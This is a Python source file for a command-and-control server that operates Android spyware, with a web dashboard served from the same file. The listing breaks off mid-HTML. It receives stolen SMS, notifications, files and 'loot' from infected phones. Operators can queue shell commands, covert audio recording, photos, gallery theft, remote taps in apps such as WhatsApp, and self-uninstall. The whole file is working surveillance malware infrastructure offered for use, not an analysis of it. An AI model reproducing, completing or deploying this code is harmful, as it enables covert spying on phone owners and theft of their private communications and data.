#!/usr/bin/env python3
"""
C2 Server for Android Spyware - Full Dashboard with Auth & Speedtest
WebSocket (implants) + HTTP (dashboard) + Speedtest API
"""

import asyncio
import json
import base64
import ssl
import logging
import secrets
import hashlib
import time
import os
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from collections import defaultdict

import websockets
from aiohttp import web, WSMsgType
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import jwt

# ─── Config ──────────────────────────────────────────────────────────────
CONFIG = {
    "host": "0.0.0.0",
    "ws_port": 8443,      # WebSocket for implants
    "http_port": 8080,    # HTTP dashboard
    "ssl_cert": "cert.pem",
    "ssl_key": "key.pem",
    "jwt_secret": "change-this-in-production-" + secrets.token_hex(16),
    "jwt_algorithm": "HS256",
    "jwt_expiry_hours": 24,
    "admin_user": "admin",
    "admin_pass": "admin123",  # Change on first login!
    "speedtest_size_mb": 10,
    "loot_dir": "loot",
}

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("C2Server")

# ─── Data Models ─────────────────────────────────────────────────────────
@dataclass
class User:
    username: str
    password_hash: str
    role: str  # "admin" or "user"
    created: str
    last_login: Optional[str] = None

@dataclass
class Implant:
    device_id: str
    ws: Any
    key: str
    connected: datetime
    last_seen: datetime
    info: Dict = None
    assigned_user: Optional[str] = None  # Which user owns this implant

# ─── Crypto ──────────────────────────────────────────────────────────────
def derive_key(session_key: str) -> bytes:
    return session_key.encode()[:16].ljust(16, b'\0')

def encrypt(data: str, session_key: str) -> str:
    try:
        key_bytes = derive_key(session_key)
        cipher = Cipher(algorithms.AES(key_bytes), modes.ECB())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data.encode()) + padder.finalize()
        ct = encryptor.update(padded) + encryptor.finalize()
        return base64.b64encode(ct).decode()
    except Exception as e:
        logger.error(f"Encrypt failed: {e}")
        return ""

def decrypt(data: str, session_key: str) -> str:
    try:
        key_bytes = derive_key(session_key)
        cipher = Cipher(algorithms.AES(key_bytes), modes.ECB())
        decryptor = cipher.decryptor()
        ct = base64.b64decode(data)
        pt = decryptor.update(ct) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return (unpadder.update(pt) + unpadder.finalize()).decode()
    except Exception as e:
        logger.error(f"Decrypt failed: {e}")
        return ""

def hash_password(password: str) -> str:
    return hashlib.pbkdf2_hmac('sha256', password.encode(), b'salt', 100000).hex()

def verify_password(password: str, password_hash: str) -> bool:
    return hash_password(password) == password_hash

# ─── JWT Auth ────────────────────────────────────────────────────────────
def create_token(username: str, role: str) -> str:
    payload = {
        "sub": username,
        "role": role,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=CONFIG["jwt_expiry_hours"])
    }
    return jwt.encode(payload, CONFIG["jwt_secret"], algorithm=CONFIG["jwt_algorithm"])

def decode_token(token: str) -> Optional[dict]:
    try:
        return jwt.decode(token, CONFIG["jwt_secret"], algorithms=[CONFIG["jwt_algorithm"]])
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None

# ─── User Store ──────────────────────────────────────────────────────────
class UserStore:
    def __init__(self):
        self.users: Dict[str, User] = {}
        self.load()
        self.ensure_admin()

    def load(self):
        path = Path("users.json")
        if path.exists():
            try:
                data = json.loads(path.read_text())
                for u in data:
                    self.users[u["username"]] = User(**u)
            except Exception as e:
                logger.error(f"Failed to load users: {e}")

    def save(self):
        path = Path("users.json")
        path.write_text(json.dumps([asdict(u) for u in self.users.values()], indent=2))

    def ensure_admin(self):
        if CONFIG["admin_user"] not in self.users:
            admin = User(
                username=CONFIG["admin_user"],
                password_hash=hash_password(CONFIG["admin_pass"]),
                role="admin",
                created=datetime.utcnow().isoformat()
            )
            self.users[CONFIG["admin_user"]] = admin
            self.save()
            logger.warning(f"Created default admin: {CONFIG['admin_user']} / {CONFIG['admin_pass']}")

    def authenticate(self, username: str, password: str) -> Optional[User]:
        user = self.users.get(username)
        if user and verify_password(password, user.password_hash):
            user.last_login = datetime.utcnow().isoformat()
            self.save()
            return user
        return None

    def create_user(self, username: str, password: str, role: str = "user") -> bool:
        if username in self.users:
            return False
        if role not in ("admin", "user"):
            return False
        user = User(
            username=username,
            password_hash=hash_password(password),
            role=role,
            created=datetime.utcnow().isoformat()
        )
        self.users[username] = user
        self.save()
        return True

    def delete_user(self, username: str) -> bool:
        if username == CONFIG["admin_user"]:
            return False
        if username in self.users:
            del self.users[username]
            self.save()
            return True
        return False

    def list_users(self) -> List[dict]:
        return [
            {
                "username": u.username,
                "role": u.role,
                "created": u.created,
                "last_login": u.last_login
            }
            for u in self.users.values()
        ]

    def change_password(self, username: str, new_password: str) -> bool:
        if username in self.users:
            self.users[username].password_hash = hash_password(new_password)
            self.save()
            return True
        return False

# ─── Speedtest ───────────────────────────────────────────────────────────
class SpeedtestManager:
    def __init__(self):
        self.results: List[dict] = []
        self.load()

    def load(self):
        path = Path("speedtest_results.json")
        if path.exists():
            try:
                self.results = json.loads(path.read_text())
            except:
                self.results = []

    def save(self):
        path = Path("speedtest_results.json")
        path.write_text(json.dumps(self.results[-1000:], indent=2))

    def add_result(self, username: str, result: dict):
        result["username"] = username
        result["timestamp"] = datetime.utcnow().isoformat()
        self.results.append(result)
        self.save()

    def get_results(self, username: str = None, limit: int = 50) -> List[dict]:
        if username:
            filtered = [r for r in self.results if r.get("username") == username]
        else:
            filtered = self.results
        return filtered[-limit:]

# ─── Main C2 Server ──────────────────────────────────────────────────────
class C2Server:
    def __init__(self):
        self.implants: Dict[str, Implant] = {}
        self.command_queues: Dict[str, List[dict]] = defaultdict(list)
        self.users = UserStore()
        self.speedtest = SpeedtestManager()
        self.http_app = None
        self.ws_server = None

    # ─── Implant WebSocket ──────────────────────────────────────────────
    async def handle_implant(self, websocket, path):
        device_id = None
        session_key = None
        
        try:
            # Extract device_id from query params
            query = websocket.request_headers.get("sec-websocket-protocol", "")
            if "device=" in query:
                device_id = query.split("device=")[1].split("&")[0]
            
            if not device_id:
                await websocket.close()
                return

            logger.info(f"Implant connected: {device_id}")
            
            session_key = base64.b64encode(
                datetime.now().strftime("%Y%m%d%H%M%S%f").encode()
            ).decode()[:16]
            
            self.implants[device_id] = Implant(
                device_id=device_id,
                ws=websocket,
                key=session_key,
                connected=datetime.now(),
                last_seen=datetime.now(),
                info={}
            )
            self.command_queues[device_id] = []

            # Send session key
            welcome = json.dumps({"type": "welcome", "session_key": session_key})
            await websocket.send(json.dumps({"enc": encrypt(welcome, session_key)}))

            async for message in websocket:
                try:
                    data = json.loads(message)
                    if "enc" in data:
                        decrypted = decrypt(data["enc"], session_key)
                        if decrypted:
                            msg = json.loads(decrypted)
                            await self.process_implant_message(device_id, msg)
                            if device_id in self.implants:
                                self.implants[device_id].last_seen = datetime.now()
                except Exception as e:
                    logger.error(f"Implant message error: {e}")

        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            logger.error(f"Implant error: {e}")
        finally:
            if device_id and device_id in self.implants:
                logger.info(f"Implant disconnected: {device_id}")
                del self.implants[device_id]
                if device_id in self.command_queues:
                    del self.command_queues[device_id]

    async def process_implant_message(self, device_id: str, msg: dict):
        msg_type = msg.get("type", "")
        
        if msg_type == "heartbeat":
            pass
            
        elif msg_type == "exfil":
            data = msg.get("data", "")
            logger.info(f"Exfil from {device_id}: {len(data)} bytes")
            self.save_exfil(device_id, data)
            # Broadcast to dashboard
            await self.broadcast_dashboard({"type": "exfil", "device_id": device_id, "data": json.loads(data)})
            
        elif msg_type == "shell_result":
            output = msg.get("output", "")
            logger.info(f"Shell result from {device_id}")
            await self.broadcast_dashboard({"type": "shell_result", "device_id": device_id, "output": output})
            
        elif msg_type == "file_upload":
            file_type = msg.get("file_type", "")
            filename = msg.get("filename", "")
            b64data = msg.get("data", "")
            size = msg.get("size", 0)
            logger.info(f"File upload: {filename} ({file_type}, {size} bytes)")
            self.save_file(device_id, filename, b64data)
            await self.broadcast_dashboard({"type": "file_upload", "device_id": device_id, "filename": filename, "type": file_type})
            
        elif msg_type == "accessibility_data":
            data = msg.get("data", {})
            await self.broadcast_dashboard({"type": "accessibility", "device_id": device_id, "data": data})
            
        elif msg_type == "notification_data":
            data = msg.get("data", {})
            await self.broadcast_dashboard({"type": "notification", "device_id": device_id, "data": data})
            
        elif msg_type == "sms_intercept":
            data = msg.get("data", {})
            await self.broadcast_dashboard({"type": "sms", "device_id": device_id, "data": data})

    def save_exfil(self, device_id: str, data: str):
        Path(CONFIG["loot_dir"]).mkdir(exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{CONFIG['loot_dir']}/{device_id}_{timestamp}.json"
        with open(filename, "w") as f:
            f.write(data)

    def save_file(self, device_id: str, filename: str, b64data: str):
        Path(f"{CONFIG['loot_dir']}/files").mkdir(parents=True, exist_ok=True)
        filepath = Path(f"{CONFIG['loot_dir']}/files/{device_id}_{filename}")
        try:
            with open(filepath, "wb") as f:
                f.write(base64.b64decode(b64data))
        except Exception as e:
            logger.error(f"File save failed: {e}")

    def queue_command(self, device_id: str, command: dict):
        if device_id in self.command_queues:
            self.command_queues[device_id].append(command)

    async def send_commands(self):
        while True:
            for device_id, implant in self.implants.items():
                if device_id in self.command_queues and self.command_queues[device_id]:
                    cmd = self.command_queues[device_id].pop(0)
                    try:
                        encrypted = encrypt(json.dumps(cmd), implant.key)
                        await implant.ws.send(json.dumps({"enc": encrypted}))
                    except Exception as e:
                        logger.error(f"Command send failed: {e}")
            await asyncio.sleep(1)

    # ─── Dashboard WebSocket ────────────────────────────────────────────
    async def handle_dashboard_ws(self, request):
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        
        # Verify auth
        token = request.query.get("token")
        payload = decode_token(token) if token else None
        if not payload:
            await ws.close(code=4001, message=b"Unauthorized")
            return ws
        
        username = payload["sub"]
        logger.info(f"Dashboard WS connected: {username}")
        
        # Send initial state
        await ws.send_json({
            "type": "init",
            "implants": self.get_implants_list(username),
            "user": {"username": username, "role": payload["role"]}
        })
        
        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        await self.handle_dashboard_message(username, payload["role"], data, ws)
                    except Exception as e:
                        logger.error(f"Dashboard message error: {e}")
        except Exception as e:
            logger.error(f"Dashboard WS error: {e}")
        finally:
            logger.info(f"Dashboard WS disconnected: {username}")
        
        return ws

    async def handle_dashboard_message(self, username: str, role: str, data: dict, ws):
        msg_type = data.get("type")
        
        if msg_type == "command":
            device_id = data.get("device_id")
            command = data.get("command")
            # Check ownership
            if device_id in self.implants:
                implant = self.implants[device_id]
                if role == "admin" or implant.assigned_user == username:
                    self.queue_command(device_id, command)
                    await ws.send_json({"type": "command_queued", "device_id": device_id})
                else:
                    await ws.send_json({"type": "error", "message": "Not authorized for this device"})
        
        elif msg_type == "assign_device":
            if role == "admin":
                device_id = data.get("device_id")
                target_user = data.get("username")
                if device_id in self.implants and target_user in self.users.users:
                    self.implants[device_id].assigned_user = target_user
                    await self.broadcast_dashboard({"type": "device_assigned", "device_id": device_id, "username": target_user})
        
        elif msg_type == "speedtest_result":
            result = data.get("result", {})
            self.speedtest.add_result(username, result)
            await ws.send_json({"type": "speedtest_saved"})

    async def broadcast_dashboard(self, message: dict):
        # This would need a list of connected dashboard WS clients
        # For now, we'll skip full implementation
        pass

    # ─── HTTP Handlers ──────────────────────────────────────────────────
    async def http_login(self, request):
        data = await request.json()
        username = data.get("username", "")
        password = data.get("password", "")
        
        user = self.users.authenticate(username, password)
        if user:
            token = create_token(user.username, user.role)
            return web.json_response({
                "token": token,
                "user": {"username": user.username, "role": user.role}
            })
        return web.json_response({"error": "Invalid credentials"}, status=401)

    async def http_register(self, request):
        # Admin only
        auth = await self.check_auth(request, require_admin=True)
        if not auth:
            return web.json_response({"error": "Admin required"}, status=403)
        
        data = await request.json()
        username = data.get("username", "")
        password = data.get("password", "")
        role = data.get("role", "user")
        
        if self.users.create_user(username, password, role):
            return web.json_response({"success": True})
        return web.json_response({"error": "User exists"}, status=400)

    async def http_users(self, request):
        auth = await self.check_auth(request, require_admin=True)
        if not auth:
            return web.json_response({"error": "Admin required"}, status=403)
        
        return web.json_response({"users": self.users.list_users()})

    async def http_delete_user(self, request):
        auth = await self.check_auth(request, require_admin=True)
        if not auth:
            return web.json_response({"error": "Admin required"}, status=403)
        
        username = request.match_info.get("username")
        if self.users.delete_user(username):
            return web.json_response({"success": True})
        return web.json_response({"error": "User not found"}, status=404)

    async def http_change_password(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        data = await request.json()
        new_password = data.get("new_password", "")
        if len(new_password) < 6:
            return web.json_response({"error": "Password too short"}, status=400)
        
        if self.users.change_password(auth["username"], new_password):
            return web.json_response({"success": True})
        return web.json_response({"error": "Failed"}, status=400)

    async def http_implants(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        return web.json_response({"implants": self.get_implants_list(auth["username"], auth["role"])})

    async def http_implant_command(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        device_id = request.match_info.get("device_id")
        if device_id not in self.implants:
            return web.json_response({"error": "Device not found"}, status=404)
        
        implant = self.implants[device_id]
        if auth["role"] != "admin" and implant.assigned_user != auth["username"]:
            return web.json_response({"error": "Not authorized"}, status=403)
        
        data = await request.json()
        command = data.get("command")
        self.queue_command(device_id, command)
        return web.json_response({"success": True})

    async def http_assign_device(self, request):
        auth = await self.check_auth(request, require_admin=True)
        if not auth:
            return web.json_response({"error": "Admin required"}, status=403)
        
        device_id = request.match_info.get("device_id")
        data = await request.json()
        username = data.get("username")
        
        if device_id in self.implants and username in self.users.users:
            self.implants[device_id].assigned_user = username
            return web.json_response({"success": True})
        return web.json_response({"error": "Not found"}, status=404)

    async def http_loot(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        loot_dir = Path(CONFIG["loot_dir"])
        files = []
        if loot_dir.exists():
            for f in loot_dir.glob("*.json"):
                try:
                    data = json.loads(f.read_text())
                    files.append({
                        "filename": f.name,
                        "device_id": data.get("device_id", "unknown"),
                        "timestamp": data.get("timestamp", ""),
                        "size": f.stat().st_size
                    })
                except:
                    pass
        return web.json_response({"files": sorted(files, key=lambda x: x["timestamp"], reverse=True)})

    async def http_loot_file(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        filename = request.match_info.get("filename")
        filepath = Path(CONFIG["loot_dir"]) / filename
        if filepath.exists():
            return web.FileResponse(filepath)
        return web.json_response({"error": "Not found"}, status=404)

    async def http_speedtest_config(self, request):
        return web.json_response({
            "download_size_mb": CONFIG["speedtest_size_mb"],
            "upload_size_mb": CONFIG["speedtest_size_mb"],
            "ping_count": 10
        })

    async def http_speedtest_download(self, request):
        size_mb = int(request.query.get("size", CONFIG["speedtest_size_mb"]))
        size_bytes = size_mb * 1024 * 1024
        data = os.urandom(size_bytes)
        return web.Response(body=data, content_type="application/octet-stream")

    async def http_speedtest_upload(self, request):
        data = await request.read()
        return web.json_response({"received_bytes": len(data)})

    async def http_speedtest_ping(self, request):
        return web.json_response({"pong": True, "timestamp": time.time()})

    async def http_speedtest_results(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        username = auth["username"] if auth["role"] != "admin" else None
        results = self.speedtest.get_results(username, limit=100)
        return web.json_response({"results": results})

    async def http_stats(self, request):
        auth = await self.check_auth(request)
        if not auth:
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        user_implants = self.get_implants_list(auth["username"], auth["role"])
        return web.json_response({
            "total_implants": len(self.implants),
            "your_implants": len(user_implants),
            "online": sum(1 for i in user_implants if (datetime.now() - i["last_seen"]).seconds < 60),
            "loot_count": len(list(Path(CONFIG["loot_dir"]).glob("*.json"))) if Path(CONFIG["loot_dir"]).exists() else 0
        })

    async def check_auth(self, request, require_admin=False):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return None
        token = auth_header[7:]
        payload = decode_token(token)
        if not payload:
            return None
        if require_admin and payload.get("role") != "admin":
            return None
        return payload

    def get_implants_list(self, username: str, role: str = "user") -> List[dict]:
        result = []
        for device_id, implant in self.implants.items():
            if role == "admin" or implant.assigned_user == username:
                result.append({
                    "device_id": device_id,
                    "connected": implant.connected.isoformat(),
                    "last_seen": implant.last_seen.isoformat(),
                    "info": implant.info,
                    "assigned_user": implant.assigned_user,
                    "online": (datetime.now() - implant.last_seen).seconds < 60
                })
        return result

    # ─── HTTP App Setup ─────────────────────────────────────────────────
    def create_http_app(self):
        app = web.Application()
        
        # CORS
        async def cors_handler(request, handler):
            response = await handler(request)
            response.headers["Access-Control-Allow-Origin"] = "*"
            response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
            response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
            return response
        app.middlewares.append(cors_handler)
        
        # Static files for dashboard
        app.router.add_static("/static", Path("dashboard_static"), show_index=True)
        app.router.add_get("/", self.serve_dashboard)
        
        # Auth
        app.router.add_post("/api/login", self.http_login)
        app.router.add_post("/api/register", self.http_register)
        app.router.add_post("/api/change_password", self.http_change_password)
        
        # Users (admin)
        app.router.add_get("/api/users", self.http_users)
        app.router.add_delete("/api/users/{username}", self.http_delete_user)
        
        # Implants
        app.router.add_get("/api/implants", self.http_implants)
        app.router.add_post("/api/implants/{device_id}/command", self.http_implant_command)
        app.router.add_post("/api/implants/{device_id}/assign", self.http_assign_device)
        
        # Loot
        app.router.add_get("/api/loot", self.http_loot)
        app.router.add_get("/api/loot/{filename}", self.http_loot_file)
        
        # Speedtest
        app.router.add_get("/api/speedtest/config", self.http_speedtest_config)
        app.router.add_get("/api/speedtest/download", self.http_speedtest_download)
        app.router.add_post("/api/speedtest/upload", self.http_speedtest_upload)
        app.router.add_get("/api/speedtest/ping", self.http_speedtest_ping)
        app.router.add_get("/api/speedtest/results", self.http_speedtest_results)
        
        # Stats
        app.router.add_get("/api/stats", self.http_stats)
        
        # Dashboard WS
        app.router.add_get("/ws", self.handle_dashboard_ws)
        
        return app

    async def serve_dashboard(self, request):
        # Serve the dashboard HTML
        html = self.get_dashboard_html()
        return web.Response(text=html, content_type="text/html")

    def get_dashboard_html(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard - System Service</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace; }
        body { background: #0d1117; color: #e6edf3; min-height: 100vh; }
        .header { background: #161b22; border-bottom: 1px solid #30363d; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
        .logo { font-weight: 700; font-size: 1.25rem; color: #58a6ff; letter-spacing: -0.5px; }
        .user-info { display: flex; align-items: center; gap: 16px; font-size: 0.875rem; }
        .badge { padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; text-transform: uppercase; }
        .badge-admin { background: #f78166; color: #161b22; }
        .badge-user { background: #58a6ff; color: #161b22; }
        .btn { padding: 6px 16px; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; transition: all 0.15s; font-size: 0.875rem; }
        .btn-primary { background: #238636; color: white; }
        .btn-primary:hover { background: #2ea043; }
        .btn-danger { background: #da3633; color: white; }
        .btn-danger:hover { background: #f85149; }
        .btn-ghost { background: transparent; color: #e6edf3; border: 1px solid #30363d; }
        .btn-ghost:hover { background: #21262d; }
        .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 24px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; }
        .card h2 { font-size: 1rem; font-weight: 600; margin-bottom: 16px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; }
        .stat-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
        .stat { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; text-align: center; }
        .stat-value { font-size: 2rem; font-weight: 700; color: #58a6ff; }
        .stat-label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; margin-top: 4px; }
        .implant-list { list-style: none; }
        .implant-item { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #21262d; }
        .implant-item:last-child { border-bottom: none; }
        .implant-info { display: flex; flex-direction: column; gap: 4px; }
        .implant-id { font-family: monospace; font-size: 0.875rem; font-weight: 600; }
        .implant-meta { font-size: 0.75rem; color: #8b949e; }
        .status { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; }
        .status-online { background: #1f6feb20; color: #58a6ff; }
        .status-offline { background: #da363320; color: #f85149; }
        .status-dot { width: 6px; height: 6px; border-radius: 50%; }
        .status-online .status-dot { background: #58a6ff; }
        .status-offline .status-dot { background: #f85149; }
        .commands { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
        .cmd-input { flex: 1; min-width: 200px; padding: 8px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #e6edf3; font-family: monospace; }
        .cmd-input:focus { outline: none; border-color: #58a6ff; }
        .speedtest { text-align: center; padding: 32px; }
        .speedtest-result { font-size: 3rem; font-weight: 700; color: #58a6ff; margin: 16px 0; }
        .speedtest-label { color: #8b949e; margin-bottom: 8px; }
        .progress { width: 100%; height: 8px; background: #21262d; border-radius: 4px; overflow: hidden; margin: 16px 0; }
        .progress-bar { height: 100%; background: linear-gradient(90deg, #58a6ff, #a371f7); width: 0%; transition: width 0.1s; }
        .log { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 16px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 0.75rem; color: #8b949e; }
        .log-entry { margin: 4px 0; }
        .log-entry.error { color: #f85149; }
        .log-entry.success { color: #3fb950; }
        .tabs { display: flex; gap: 8px; margin-bottom: 16px; border-bottom: 1px solid #30363d; padding-bottom: 8px; }
        .tab { padding: 8px 16px; background: transparent; border: none; color: #8b949e; font-weight: 600; cursor: pointer; border-radius: 6px 6px 0 0; }
        .tab.active { color: #58a6ff; background: #161b22; border: 1px solid #30363d; border-bottom: none; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 1000; }
        .modal.active { display: flex; }
        .modal-box { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 24px; width: 100%; max-width: 400px; }
        .modal-box h3 { margin-bottom: 16px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; margin-bottom: 6px; font-size: 0.875rem; color: #8b949e; }
        .form-group input, .form-group select { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #e6edf3; }
        .form-group input:focus { outline: none; border-color: #58a6ff; }
        .modal-actions { display: flex; justify-content: flex-end; gap: 12px; margin-top: 24px; }
        @media (max-width: 768px) {
            .stat-grid { grid-template-columns: repeat(2, 1fr); }
            .grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">🛰️ System Service C2</div>
        <div class="user-info">
            <span id="currentUser">Loading...</span>
            <span id="userRole" class="badge badge-user">user</span>
            <button class="btn btn-ghost" onclick="logout()">Logout</button>
        </div>
    </header>
    
    <div class="container">
        <div class="stat-grid" id="stats">
            <div class="stat"><div class="stat-value" id="statTotal">-</div><div class="stat-label">Total Implants</div></div>
            <div class="stat"><div class="stat-value" id="statYours">-</div><div class="stat-label">Your Implants</div></div>
            <div class="stat"><div class="stat-value" id="statOnline">-</div><div class="stat-label">Online</div></div>
            <div class="stat"><div class="stat-value" id="statLoot">-</div><div class="stat-label">Loot Files</div></div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="showTab('implants')">📱 Implants</button>
            <button class="tab" onclick="showTab('speedtest')">🚀 Speedtest</button>
            <button class="tab" onclick="showTab('loot')">📁 Loot</button>
            <button class="tab" onclick="showTab('users')">👥 Users</button>
            <button class="tab" onclick="showTab('log')">📋 Log</button>
        </div>
        
        <!-- Implants Tab -->
        <div id="tab-implants" class="tab-content active">
            <div class="card">
                <h2>Connected Devices</h2>
                <ul class="implant-list" id="implantList">
                    <li class="implant-item"><div class="implant-info"><div class="implant-id">No implants connected</div></div></li>
                </ul>
            </div>
        </div>
        
        <!-- Speedtest Tab -->
        <div id="tab-speedtest" class="tab-content">
            <div class="card">
                <h2>Internet Speed Test</h2>
                <div class="speedtest">
                    <div class="speedtest-label">Click to test your connection</div>
                    <div class="speedtest-result" id="speedResult">--</div>
                    <div class="speedtest-label" id="speedDetail">Download / Upload / Ping</div>
                    <button class="btn btn-primary" style="padding: 16px 48px; font-size: 1.125rem;" onclick="runSpeedtest()">Start Speed Test</button>
                    <div class="progress" style="display:none;" id="speedProgress"><div class="progress-bar" id="speedProgressBar"></div></div>
                    <div style="margin-top: 16px; font-size: 0.875rem; color: #8b949e;">
                        Results are saved to your account history
                    </div>
                </div>
                <h3 style="margin-top: 32px;">History</h3>
                <div class="log" id="speedHistory"></div>
            </div>
        </div>
        
        <!-- Loot Tab -->
        <div id="tab-loot" class="tab-content">
            <div class="card">
                <h2>Exfiltrated Data</h2>
                <div class="log" id="lootList">Loading...</div>
            </div>
        </div>
        
        <!-- Users Tab (Admin) -->
        <div id="tab-users" class="tab-content">
            <div class="card">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
                    <h2>User Management</h2>
                    <button class="btn btn-primary" onclick="openUserModal()">Add User</button>
                </div>
                <div class="log" id="userList">Loading...</div>
            </div>
        </div>
        
        <!-- Log Tab -->
        <div id="tab-log" class="tab-content">
            <div class="card">
                <h2>Activity Log</h2>
                <div class="log" id="activityLog">Waiting for activity...</div>
            </div>
        </div>
    </div>
    
    <!-- User Modal -->
    <div class="modal" id="userModal">
        <div class="modal-box">
            <h3 id="modalTitle">Add User</h3>
            <form id="userForm">
                <input type="hidden" id="editUserId">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" id="inputUsername" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="inputPassword" required minlength="6">
                </div>
                <div class="form-group">
                    <label>Role</label>
                    <select id="inputRole">
                        <option value="user">User</option>
                        <option value="admin">Admin</option>
                    </select>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-ghost" onclick="closeUserModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Save</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Implant Command Modal -->
    <div class="modal" id="cmdModal">
        <div class="modal-box">
            <h3>Send Command to <span id="cmdDeviceId"></span></h3>
            <form id="cmdForm">
                <div class="form-group">
                    <label>Command</label>
                    <select id="cmdType" onchange="updateCmdFields()">
                        <option value="shell">Shell Command</option>
                        <option value="collect_now">Collect Data</option>
                        <option value="record_audio">Record Audio</option>
                        <option value="take_photo">Take Photo</option>
                        <option value="exfil_gallery">Exfil Gallery</option>
                        <option value="interact_click">Click Element</option>
                        <option value="interact_input">Input Text</option>
                        <option value="interact_scroll">Scroll</option>
                        <option value="interact_swipe">Swipe</option>
                        <option value="interact_global">Global Action</option>
                        <option value="dump_ui">Dump UI Tree</option>
                        <option value="uninstall">Uninstall (Self-Destruct)</option>
                    </select>
                </div>
                <div class="form-group" id="fieldShell">
                    <label>Command</label>
                    <input type="text" id="cmdShell" placeholder="whoami && id">
                </div>
                <div class="form-group" style="display:none;" id="fieldDuration">
                    <label>Duration (seconds)</label>
                    <input type="number" id="cmdDuration" value="30" min="1" max="300">
                </div>
                <div class="form-group" style="display:none;" id="fieldGallery">
                    <label>Type</label>
                    <select id="cmdGalleryType">
                        <option value="image">Images</option>
                        <option value="video">Videos</option>
                        <option value="audio">Audio</option>
                        <option value="download">Downloads</option>
                    </select>
                </div>
                <div class="form-group" style="display:none;" id="fieldGalleryLimit">
                    <label>Limit</label>
                    <input type="number" id="cmdGalleryLimit" value="50" min="1" max="500">
                </div>
                <div class="form-group" style="display:none;" id="fieldTarget">
                    <label>Target (ID or text)</label>
                    <input type="text" id="cmdTarget" placeholder="@id/com.whatsapp:id/send OR Send">
                </div>
                <div class="form-group" style="display:none;" id="fieldInputText">
                    <label>Text to input</label>
                    <input type="text" id="cmdInputText" placeholder="Message to type">
                </div>
                <div class="form-group" style="display:none;" id="fieldScrollDir">
                    <label>Direction</label>
                    <select id="cmdScrollDir">
                        <option value="down">Down</option>
                        <option value="up">Up</option>
                    </select>
                </div>
                <div class="form-group" style="display:none;" id="fieldSwipe">
                    <label>X</label>
                    <input type="number" id="cmdSwipeX" value="500">
                    <label style="margin-top:8px;">Y</label>
                    <input type="number" id="cmdSwipeY" value="1000">
                </div>
                <div class="form-group" style="display:none;" id="fieldGlobal">
                    <label>Action</label>
                    <select id="cmdGlobal">
                        <option value="back">Back</option>
                        <option value="home">Home</option>
                        <option value="recent">Recent Apps</option>
                        <option value="notifications">Notifications</option>
                        <option value="quick_settings">Quick Settings</option>
                        <option value="power_dialog">Power Dialog</option>
                    </select>
                </div>
                <div class="modal-actions">
